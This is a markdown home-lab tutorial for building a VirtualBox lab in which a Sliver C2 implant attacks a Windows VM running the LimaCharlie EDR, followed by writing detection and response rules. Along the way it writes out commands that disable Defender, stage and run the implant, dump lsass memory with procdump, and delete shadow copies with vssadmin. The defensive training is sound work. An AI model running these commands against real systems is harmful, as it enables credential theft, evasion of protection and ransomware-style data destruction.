# LimaCharlie EDR Telemetry
## Virtual Machines
- **Windows 11 development environment (Target)**
    - Sysmon and LimaCharlie (EDR) Sensor installed
- **Ubuntu Server 22.04.2 (Attack)**
    - Sliver C2 Framework

## Step 1: Set up the virtual environment
1. Download and install **Oracle VM VirtualBox Manager**
   (https://www.virtualbox.org/wiki/Downloads).
2. Download and deploy a free **Windows VM** directly from Microsoft
   (https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/):
    1. Get the **VirtualBox** version of the VM.
    2. Take notice of the **Expiration date of your VM**, it will stop working after this date, but you can always download a new one.
    3. Once downloaded, unzip the VM and import on **VirtualBox** the **WinDev####Eval.ova** file, but do not start it up yet.
    4. Once imported, it has 8GB by default but can run with 4GB or 2GB and it can also run with 2 CPUs. If the VMs run slow, it may be due to not enough free RAM on your host.
3. Download and install **Ubuntu Server** into a new **VM**:
    1. Download the **Ubuntu Server 22.04.2** installer ISO (https://releases.ubuntu.com/22.04.1/ubuntu-22.04.1-live-server-amd64.iso).
        1. **NOTE:** The **Server version of Ubuntu** comes preinstalled with necessary packages. If you choose the Desktop flavor, you will have issues, and you are wasting unnecessary resources.
    2. Before create the **VM** lets create the **NAT Network** the will be used by it:
        1. On **VirtualBox Manager** go to **File > Preferences**:
            1. On **Network** click on **Adds new NAT network**.
            2. Click on **Edits selected NAT network**.
                1. (check) **Enable Network**
                2. **Network Name**: NatNetwork
                3. **Network CIDR**: 10.0.2.0/24
                4. **Network Options**: (check) Supports DHCP
                5. Click on **Port Forwarding**:
                    - **Name:** SSH
                    - **Protocol:** TCP
                    - **Host IP:** 127.0.0.1
                    - **Host Port:** 2200
                    - **Guest IP:** 10.0.2.4
                    - **Guest Port:** 22
                    - **NOTE:** The **Port Forwarding** will redirect the to connections to **127.0.0.1:2200 (Host Machine)** to **10.0.2.4:22 (VM)** so to make **SSH** from the **Host** to the **VM** you have to stablishe a **SSH connection** to the **address 120.0.0.1** and **port 2200**, e.g., `ssh -p 2200 user@127.0.0.1`
    3. Once downloaded, create a new **VM** in **VirtualBox Manager** with the following specs:
        1. Customize Hardware:
            1. **Memory size:** 2GB RAM
            2. Create a **Virtual HD > VDI > Dynamic > Disk size: 14GB**
            3. **Processors:** 2 CPUs
            4. **Network Adapter**:
                - **Attached to:** NAT Network
                - **Name:** NatNetwork
        2. Start the **VM**.
        3. Use the **downloaded ISO** as the installer image.
        4. During OS install, leave defaults unless otherwise specified:
            1. Use Tab to navigate, Space to check boxes, Enter to confirm.
            2. **Installer update available**:
                1. Continue without updating.
            3. Chose **Keyboard configuration**.
            4. Choose **type of install**:
                1. (check) **Ubuntu Server**.
            5. On **Network connections** section, we need to take a few steps to set a **static IP address** for this **VM** so that it doesn’t change throughout the lab or beyond it.
                2. **Change the interface from DHCPv4 to Manual**:
                    1. Click on **enp0s3 > Edit IPv4**
                    2. **IPv4 Method:** Manual
                    3. Use the Network CIDR of the NAT Network created before:
                        - **IPv4 Methos:** Manual
                        - **Subnet:** 10.0.2.0/24
                        - **Address:** 10.0.2.4
                        - **Gateway:** 10.0.2.1
                        - **Name servers:** 8.8.8.8
                        - **Serch domains:**
                        - **Save**
                    4. When you’re done, you should see this:
                        - On Network connections:   <br/>
                      **NAME** &emsp; **TYPE** &emsp;   **NOTES**   <br/>
                        enp0s3 &ensp; eth  &emsp;&emsp;   -         <br/>
                        static &emsp; 10.0.2.4/24
                    5. **NOTE:** Write down the **Linux VM’s IP address** because you will need it multiple times throughout this guide.
                    6. Hit **Done**.
            6. **Configure Proxy**:
                1. Leave empty.
            7. **Configure Ubuntu archive mirror**:
                1. Leave default.
            8. **Checking for installer update**:
                1. Wait or hit Continue without updating.
            9. **Guided storage configuration**:
                1. (check) **Use an entire disk**.
                2. (check) **Set up this disk as an LVM group**.
                3. Hit **Done**.
            10. **Storage configuration**:
                1. Hit **Done**.
            11. **Profile setup**:
                1. **Your name:** user
                2. **Your server’s name:** attack
                3. **Username:** user
                4. **Password:** your_password
                5. Hit **Done**.
            12. **Upgrade to Ubuntu Pro**:
                1. (check) **Skip for now**.
                2. Hit **Contitue**.
            13. **SSH Setup**:
                1. (check) **Install OpenSSH server**.
                2. **Import SSH identity:** No
                3. Hit **Done**.
            14. Continue installing OS until show **Install complete!**
            15. Hit Enter on **Cancel update and reboot**.
                1. If it hangs on removing the CDROM just press Enter.
    3. After the reboot, let’s perform a quick connectivity check.
        1. Logon with the credentials we defined during install:
            1. **Username:** user
            2. **Password:** your_password
        2. Make sure DNS and outbound pings are working: <br/>
            `$ ping 8.8.8.8`
        3. If you got response, you’re good to go.

## Step 2: Disable Defender on Windows VM
1. **Disable Tamper Protection:**
    1. Click the **Start** menu icon.
    2. Click **Settings**.
    3. Click **Privacy & security** on the left.
    4. Click **Windows Security**.
    5. Click **Virus & threat protection**.
    6. Under **Virus & threat protection settings** click **Manage settings**.
    7. Toggle OFF the **Tamper Protection** switch. When prompted, click **Yes**.
    8. While you’re in there, **toggle every other option OFF as well**, even though we’re about to take care of it a couple different ways.
    9. Close the windows we just opened.
2. **Permanently Disable Defender via Group Policy Editor:**
    1. Click the **Start** menu icon.
    2. Type **cmd** into the search bar within the **Start Menu**.
    3. Right+Click **Command Prompt** and click **Run as administrator**.
        1. Run the following command: <br/>
            `\> gpedit.msc`
    4. Inside the **Local Group Policy Editor.**
        1. Click **Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus**
        2. Double-click **Turn off Microsoft Defender Antivirus**.
        3. Select **Enabled**.
            - If you enable this policy setting, **Microsoft Defender Antivirus** does not run, and will not scan computers for malware or other potentially unwanted software.
        4. Click **Apply**.
        5. Click **OK**.
3. **Permanently Disable Defender via Registry.**
    1. From the same **administrative command prompt** we previously opened, copy/paste this command and press Enter:
        ```
        \> REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
        ```
    2. While you’re still in the **administrative command prompt**, let’s also **prevent the VM from going into sleep/standby mode** during our tests:
        ```
        \> powercfg /change standby-timeout-ac 0
        \> powercfg /change standby-timeout-dc 0
        \> powercfg /change monitor-timeout-ac 0
        \> powercfg /change monitor-timeout-dc 0
        \> powercfg /change hibernate-timeout-ac 0
        \> powercfg /change hibernate-timeout-dc 0
        ```
4. **Prepare to boot into Safe Mode to disable all Defender services**:
    1. Click the **Start** menu icon.
    2. Type **msconfig** into the search bar within the **Start Menu** and open **System Configuration**.
    3. Go to **Boot** tab and on **Boot Options**:
        1. Check the box for **Safe boot** and **Minimal**.
        2. Click **Apply** and **OK**.
    4. System will **restart into Safe Mode**.
5. Now, in **Safe Mode**, we’ll disable some services via the **Registry**:
    1. Click the **Start** menu icon.
    2. Type **regedit** into the search bar and hit Enter.
    3. For each of the following registry locations, you’ll need to browse to the key, find the **Start** value, and change it to **4**:
        1. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Sense`
        2. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot`
        3. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter`
        4. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv`
        5. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc`
        6. `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend`
6. Leave **Safe Mode** the same way we got into it:
    1. Click the **Start** menu icon.
    2. Type **msconfig** into the search bar within the **Start Menu** and open **System Configuration**.
    3. Go to **Boot** tab and on **Boot Options**.
        1. Uncheck the box for **Safe boot**.
        2. Click **Apply** and **OK**.
    4. **System will restart** into normal desktop environment, now (hopefully) **Defender-free**.

## Step 3: Install Sysmon in Windows VM
1. Launch an **Administrative PowerShell console** for the following commands:
    1. Click the **Start** menu icon.
    2. Type **powershell** into the search bar within the **Start Menu**.
    3. Right+Click **Windows PowerShell** and click **Run as administrator**
2. Download **Sysmon** with the following command. Read more about **Sysmon** here (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon):
```
PS \> Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
```
3. Unzip **Sysmon.zip**:
```
PS \> Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
```
4. Download **SwiftOnSecurity’s** (https://infosec.exchange/@SwiftOnSecurity) **Sysmon config**:
```
PS \> Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
5. Install **Sysmon** with **Swift’s config**:
```
PS \> C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
```
6. Validate **Sysmon64 service** is installed and running:
```
PS \> Get-Service sysmon64
```
7. Check for the presence of **Sysmon Event Logs**:
```
PS \> Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
```

## Step 4: Install LimaCharlie EDR on Windows VM
1. Create a **free LimaCharlie account** (https://app.limacharlie.io/signup).
2. Once **logged into LimaCharlie**, create an **organization**:
    1. **Name:** unique_name
    2. **Data Residency:** closest_residency
    3. **Demo Configuration Enabled:** disabled
    4. **Template:** Extended Detection & Response Standard
3. Once the organization is created, click **Add Sensor**:
    1. Select **Windows**.
    2. Provide a description such as: **Windows VM - Lab**
    3. Click **Create**.
    4. Select the **Installation Key** we just created.
    5. Specify the **x86-64 (.exe)** sensor, but don't follow the instructions provided.
    6. In the **Windows VM**, open an **Administrative PowerShell console** and paste the following commands:
    ```
    PS \> cd C:\Users\User\Downloads
    PS \> Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe
    ```
    7. Shift into a **standard command prompt** by running this command:
    ```
    PS \> cmd.exe
    ```
    8. Next, we will copy the **install command provided by LimaCharlie on step 4 which contains the installation key**. Paste this command into your open terminal:
    ```
    \> lc_sensor.exe -i <key>
    ```
    9. Ignore the **ERROR** that says **service installed!**
        1. If you experience an error trying to install the (.exe), try the
        x86-64 (.msi) option on the LimaCharlie installer dialog.
    10. If everything worked correctly, in the **LimaCharlie web UI** you should also see the sensor reporting in, click on **Finish**.
4. Now let’s **configure LimaCharlie** to also ship the **Sysmon event logs** alongside its own **EDR telemetry**:
    1. In the left-side menu, click **Artifact Collection**.
    2. Next to **Artifact Collection Rules** click **Add Rule**:
        1. **Name:** windows-sysmon-logs
        2. **Platforms:** Windows
        3. **Path Pattern:** wel://Microsoft-Windows-Sysmon/Operational:*
        4. **Retention Period:** 10
        5. Click **Save Rule**.
    3. **LimaCharlie** will now start shipping **Sysmon logs** which provide a wealth of **EDR-like telemetry**, some of which is redundant to **LC’s own telemetry**, but **Sysmon** is still a very power visibility tool that runs well alongside any **EDR agent**.
        1. The other reason we are ingesting **Sysmon logs** is that the built-in **Sigma rules** we previously enabled largely depend on **Sysmon logs** as that is what most of them were written for.
5. That’s all we’ll do with **LimaCharlie** for now. Feel free to close all open windows on the **Windows VM**.
    1. Now would be a good time to **Snapshot** your **Windows VM**.

## Step 5: Setup Attack System
1. Logon on the **Ubuntu Server**.
2. Let’s find out the **IP address your VM is using as a gateway**, which is given to it by **VirtualBox**:
```
$ route -n
```
3. Type the following command to edit the configuration file for the network manager **netplan** and set a static IP address:
```
$ sudo nano /etc/netplan/00-installer-config.yaml
    # This is the network config written by 'subiquity'
    network:
    ethernets:
        ens33:
        dhcp4: no
        addresses: [10.0.2.4/24]       # ens33 IP address
        routes:
        - to: default
            via: 10.0.2.1                 # Gateway
        nameservers:
            addresses: [8.8.8.8,8.8.4.4]
    version: 2
$ sudo netplan try
$ sudo netplan apply
$ ping 8.8.8.8
```
4. Now that we have a statically assigned IP address that should not change, let’s **SSH onto the VM** from your host system to make future CLI activities easier thanks to copy/paste magic:
```
$ ssh -p 2200 user@127.0.0.1
```
5. Now, from within this new SSH session, proceed with the following instructions to setup our **attacker C2 server**. First, let’s drop into a root shell to make life easier:
```
$ sudo su
```
6. Run the following commands to download **Sliver**, a **Command & Control (C2) framework by BishopFox**. I recommend copy/pasting the entire block as there is line-wrapping occurring:
```
# Download Sliver Linux server binary
$ wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
# Make it executable
$ chmod +x /usr/local/bin/sliver-server
# install mingw-w64 for additional capabilities
$ apt install -y mingw-w64
```
7. Now let’s create a **working directory** we’ll use in future steps
```
# Create and enter our working directory
$ mkdir -p /opt/sliver
```

## Step 6: Generate our C2 payload
1. Drop into a **root shell**:
```
$ sudo su
```
2. Launch **Sliver server**:
```
$ sliver-server
```
3. Generate our first **C2 session payload** (https://github.com/BishopFox/sliver/wiki/Getting-Started#session-mode) within the **Sliver shell** above. Be sure to use your **Linux VM’s IP address** we statically set in **Part 1**:
```
[server] sliver > generate --http <Linux_VM_IP> --save /opt/sliver
```
4. Confirm the new **implant configuration**:
```
[server] sliver > implants
```
5. Now we have a **C2 payload** we can drop onto our **Windows VM**. We’ll do that next. Go ahead and **exit Sliver** for now:
```
[server] sliver > exit
```
6. To easily **download the C2 payload from the Linux VM to the Windows VM**, let’s turn up a temporary **python web server**:
```
$ cd /opt/sliver
$ python3 -m http.server 80
```
7. Switch to the **Windows VM** and launch an **Administrative PowerShell console**. Now run the following command to **download your C2 payload from the Linux VM to the Windows VM**, swapping your own Linux VM IP [Linux_VM_IP] and the name of the payload we generated in Sliver [payload_name] a few steps prior:
```
PS\> IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
```
8. Now would be a good time to **Snapshot** your **Windows VM**, before we execute the malware.
    1. Snapshot name: **Malware staged**

## Step 7: Start Command and Control Session
1. Now that the payload is on the Windows VM, we must switch back to the **Linux VM SSH session** and enable the **Sliver HTTP server** to catch the callback:
    1. First, **terminate the python web server** we started by pressing Ctrl + C.
    2. Now, relaunch **Sliver as root**:
    ```
    $ sliver-server
    ```
    3. Start the **Sliver HTTP listener**:
    ```
    [server] sliver > http
    ```
    4. If you get an **error starting the HTTP listener**, try rebooting the Linux VM and retrying.
2. Return to the **Windows VM** and **execute the C2 payload** from its download location using the same **administrative PowerShell prompt** we had from before:
```
PS\> C:\Users\User\Downloads\[your_C2-implant].exe
```
3. Within a few moments, you should see your **session in the Sliver server**.
4. Type **sessions** on the **Sliver shell** and take note of the **Session ID**:
```
[server] sliver > sessions
```
5. To interact with your new **C2 session** (https://github.com/BishopFox/sliver/wiki/Getting-Started#interacting-with-sessions), type the following command into the **Sliver shell**, swapping [session_id] with yours:
```
[server] sliver > use [session_id]
```
6. You are now interacting directly with the **C2 session** on the **Windows VM**. Let’s run a few **basic commands** to get our bearing on the **victim host**:
    1. Get **basic info** about the **session**:
    ```
    [server] sliver (payload_name) > info
    ```
    2. Find out what **user your implant is running as**, and learn it’s **privileges**:
    ```
    [server] sliver (payload_name) > whoami
    [server] sliver (payload_name) > getprivs
    ```
    - If your **implant** was properly run with **Admin rights**, you’ll notice we have a few **privileges** that make further attack activity much easier, such as **SeDebugPrivilege** — if you do not see these privileges, make sure you ran the implant from an Administrative command prompt.
    3. Identify our **implant’s working directory**:
    ```
    [server] sliver (payload_name) > pwd
    ```
    4. Examine **network connections** occurring on the **remote system**:
    ```
    [server] sliver (payload_name) > netstat
    ```
    - Notice that **Sliver cleverly highlights its own process in green**.
    - **rphcp.exe** is the **LimaCharlie EDR service executable**.
    5. Identify **running processes** on the remote system:
    ```
    [server] sliver (payload_name) > ps -T
    ```
    - Notice that **Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red**.

## Step 8: Observe EDR Telemetry So Far
1. Let’s hop into the **LimaCharlie web UI** (https://app.limacharlie.io/) and check out some basic features:
    1. Click **Sensors** on left menu.
    2. Click your **active Windows sensor**.
    3. On the new left-side menu for this sensor, click **Processes**:
        1. Spend a few minutes exploring what is returned in the **process tree**. Hover over some of the icons to see what they represent.
            1. Get familiar with the most common processes you’ll encounter on even a healthy system. For some helpful resources in **knowing normal**, check out the **Hunt Evil** (https://www.sans.org/posters/hunt-evil/) poster from SANS and sign up for a free account at EchoTrail (https://www.echotrail.io/).
        2. A process carrying a valid signature (Signed) is often (almost always) going to be benign itself. However, even legitimate signed processes can be used to launch malicious processes/code (read up on LOLBINs (https://lolbas-project.github.io/#)).
        3. One of the easiest ways to **spot unusual processes** is to simply look for ones that are **NOT signed**.
        4. In my example, my **C2 implant** shows as not signed, and is also **active on the network**.
        5. Notice how quickly we are able to **identify the destination IP** this process is communicating with.
    4. Now click the **Network** tab on the left-side menu.
        1. Spend a few minutes exploring what is returned in the **network list**. Try using **Ctrl+F to search** for your **implant name** and/or **C2 IP address**.
    5. Now click the **File System** tab on the left-side menu:
        1. Browse to the **location** we know our **implant** to be **running** from:
            1. `C:\Users\User\Downloads`
        1. Inspect the **hash** of the **suspicious executable** by **scanning it with VirusTotal**.
        3. Pro Tip: While it says **Scan with VirusTotal**, what it’s actually doing is querying **VirusTotal** for the **hash** of the **EXE**. If the file is a **common/well-known malware sample**, you will know it right away. However, **Item not found** on **VT** does not mean that this file is innocent, just that it’s never been seen before by **VirusTotal**. This makes sense because we just generated this **payload** ourselves, so of course it’s not likely to be seen by **VirusTotal** before. This is an important lesson for any analyst to learn — if you already suspect a file to be possible **malware**, but **VirusTotal** has never seen it before, trust your gut. This actually makes a file even more suspicious because nearly everything has been seen by **VirusTotal**, so your sample may have been **custom-crafted/targeted** which ups the ante a bit. In a mature **SOC**, this would likely affect the **TLP** of the **IOC** and/or case itself.
    6. Click **Timeline** on the left-side menu of our sensor. This is a **near real-time view of EDR telemetry + event logs streaming** from this system:
        1. Read about the various **EDR events** in the **LimaCharlie docs** (https://doc.limacharlie.io/docs/documentation/5e1d6b66e38e0-windows-sensor#supported-events).
        2. Practice filtering your timeline with **known IOCs** (indicators of compromise) such as the **name of your implant** or the known **C2 IP address**:
            1. If you **scroll back** far enough, should be able to find the **moment your implant was created on the system**, and **when it was launched shortly after**, and the **network connections it created immediately after**.
            2. Examine the other events related to your implant process, you’ll see it is responsible for other events such as **SENSITIVE_PROCESS_ACCESS** from when we enumerated our privileges in an earlier step. This particular event will be useful later on when we craft our first detection rule.

# LSASS Access

## Step 9: Let’s Perform the Attack
1. Get back onto an **SSH session** on the **Linux VM**, and drop into a **C2 session** on your victim.
    1. Retrace your steps from **Step 7** if need be.
2. Run the following commands within the **Sliver session** on your victim host:
    1. First, we need to **check our privileges** to make sure we can perform privileged actions on the host:
    ```
    [server] sliver (payload_name) > getprivs
    ```
    - A powerful privilege to check for is **SeDebugPrivilege** which opens the door for many things. If you’ve got that, we’re good. If you don’t you need to **relaunch your C2 implant with administrative rights** as we did in **Step 7**.
    2. Next, let’s do something adversaries love to do for **stealing credentials** on a system — **dump the lsass.exe process from memory**. Read more about this technique here (https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/):
    ```
    [server] sliver (payload_name) > procdump -n lsass.exe -s lsass.dmp
    ```
    - This will **dump the remote process from memory**, and **save it locally on your Sliver C2 server**. We are not going to further process the lsass dump, but I’ll leave it as an exercise for the reader if you want to try your hand (https://xapax.github.io/security/#attacking_active_directory_domain/active_directory_privilege_escalation/credential_extraction/#mimikatzpypykatz) at it.
    - **NOTE:** This will fail if you did not launch your C2 payload with admin rights on the Windows system. If it still fails for an unknown reason (RPC error, etc), don’t fret, it likely still generated the telemetry we needed. Move on and see if you can still detect the attempt.

## Step 10: Let’s Create the Detection Rule
1. Now that we’ve done something adversarial, let’s switch over to
   **LimaCharlie** (https://app.limacharlie.io/) to find the relevant telemetry:
    1. Since **lsass.exe** is a known sensitive process often targeted by credential dumping tools, any good **EDR** will generate events for this.
    2. Drill into the **Timeline** of your **Windows VM sensor** and use the **Event Type Filters** to filter for **SENSITIVE_PROCESS_ACCESS** events.
        1. There will likely be many of these, but pick any one of them as there isn’t much else on this system that will be legitimately accessing lsass.
    3. Now that we know what the event looks like when **credential access** occurred, we have what we need to craft a **Detection & Response (D&R) Rule** (https://doc.limacharlie.io/docs/documentation/ZG9jOjE5MzExMDE-detection-and-response-rules) that would alert anytime this activity occurs:
        1. Click on the **Build D&R Rule** button in the top right of the event box to begin building a detection rule based on this event.
        2. In the **Detect** section of the new rule, remove all contents and replace them with this:
        ```
        event: SENSITIVE_PROCESS_ACCESS
        op: ends with
        path: event/*/TARGET/FILE_PATH
        value: lsass.exe
        ```
        - We’re specifying that this detection should only look at **SENSITIVE_PROCESS_ACCESS** events where the victim or target process ends with **lsass.exe**
            - For posterity let me state, this rule would be very noisy and need further tuning in a production environment, but for the purpose of this learning exercise, simple is better.
        3. In the **Respond** section of the new rule, remove all contents and replace them with this:
        ```
        - action: report
          name: LSASS access
        ```
        - We’re telling **LimaCharlie** to simply generate a **detection report** anytime this detection occurs. For more advanced response capabilities, check out the docs. We could ultimately tell this rule to do all sorts of things (https://doc.limacharlie.io/docs/documentation/b43d922abb409-reference-actions), like terminate the offending process chain, etc. Let’s keep it simple for now.
        4. Now let’s test our rule against the event we built it for. Lucky for us, **LimaCharlie** carried over that event it provides a quick and easy way to test the **D&R logic**:
            1. Click **Target Event** below the **D&R rule** you just wrote.
                1. Here you will see the **raw event** we observed in the timeline earlier.
            2. Scroll to the bottom of the **raw event** and click **Test Event** to see if our detection would work against this event.
                1. Notice that we have a **Match** and the **D&R engine** tells you exactly what it matched on.
            3. Scroll back up and click **Save Rule** and give it the name **LSASS Accessed** and be sure it is enabled.

## Step 11: Let’s Detect the Attack
1. Return to your **Sliver server console**, back into your **C2 session**, and **rerun our same procdump command** from the beginning of this post.
    1. If at some point your **C2 session dies**, just **relaunch your malware** with the steps in **Step 7**.
2. **After rerunning the procdump command**, go to the **Detections** tab on the **LimaCharlie** main left-side menu:
    1. If you are still in the **context** of your **sensor**, click **Back to Sensors** at the top of the menu, then you will see the **Detections** option.
    2. You’ve just **detected a threat** with your own **detection signature**! Expand a detection to see the raw event
    3. Notice you can also go straight to the **timeline** where this event occurred by clicking **View Event Timeline** from the Detection entry.

# Volume Shadow Copies Deletion Using vssadmin

## Why This Rule?
1. This **command** used in **Ransonware attacks** to **delete the volume shadow copies** (https://redcanary.com/blog/its-all-fun-and-games-until-ransomware-deletes-the-shadow-copies/):
```
\> vssadmin delete shadows /all
```

## Step 12: Let’s Attack and Detect It!
1. Get back onto an **SSH session on the Linux VM**, and drop into a **C2 session on your victim**:
    1. Retrace your steps from **Step 7** if need be.
    2. If you have issues reestablishing your **HTTP listener**, try rebooting your Ubuntu system.
2. In your **Sliver C2 shell** on the victim, run the basic command we’re looking to detect and block:
```
[server] sliver (payload_name) > shell
```
- When prompted with **This action is bad OPSEC, are you an adult?** type **Y** and hit enter.
3. In the new **System shell**, run the following command:
```
PS C:\Windows\system32> vssadmin delete shadows /all
```
- The output is not important as there may or not be **Volume Shadow Copies** available on the VM to be deleted, but running the command is sufficient to generate the telemetry we need.
4. Run the **whoami** command to verify we still have an **active system shell**:
```
PS C:\Windows\system32> whoami
```
5. Browse over to **LimaCharlie’s Detections** tab to see if **default Sigma rules** picked up on our shenanigans.
6. Click to expand the **detection** and examine all of the **metadata** contained within the detection itself. One of the great things about **Sigma rules** is they are enriched with references to help you understand why the detection exists in the first place.
    1. One of the reference URLs contains a **YARA signature** (https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/gen_ransomware_command_lines.yar) written by **Florian Roth** that contains several more possible command lines that we’d want to consider in a very robust detection rule.
7. View the offending event in the **Timeline** to see the **raw event** that generated this detection.
8. Craft a **Detection & Response (D&R) rule** from this event.
9. From this **D&R rule template**, we can begin crafting our response action that will take place when this activity is observed:
    1. Add the following **Response rule** to the **Respond section**:
    ```
    - action: report
      name: vss_deletion_kill_it
    - action: task
      command:
        - deny_tree
        - <<routing/parent>>
    ```
    2. The **action: report** section simply fires off a **Detection report** to the **Detections** tab.
    3. The **action: task** (https://doc.limacharlie.io/docs/documentation/b43d922abb409-reference-actions#task) section is what is responsible for killing the parent process responsible with **deny_tree** (https://doc.limacharlie.io/docs/documentation/819e855933d6c-reference-commands#deny_tree) for the **vssadmin delete shadows /all command**.
10. Test the event and save your rule with the following name: **vss_deletion_kill_it**

## Step 13: Let’s Block It!
1. Run the command to **delete volume shadows**:
```
PS C:\Windows\system32> vssadmin delete shadows /all
```
- The command should succeed, but the **action of running the command** is what will **trigger** our **D&R rule**.
2. Now, to test if our **D&R rule** properly terminated the parent process, **check to see if you still have an active system shell** by rerunning the **whoami** command:
```
PS C:\Windows\system32> whoami
```
- If our **D&R rule** worked successfully, the **system shell will (exit) hang and fail to return anything from the whoami** command, because the **parent process was terminated**.
- This is effective because in a **real ransomware scenario**, the parent process is likely the **ransomware payload** or **lateral movement tool** that would be terminated in this case.
3. **Terminate your (now dead) system shell** by pressing **Ctrl + D**.
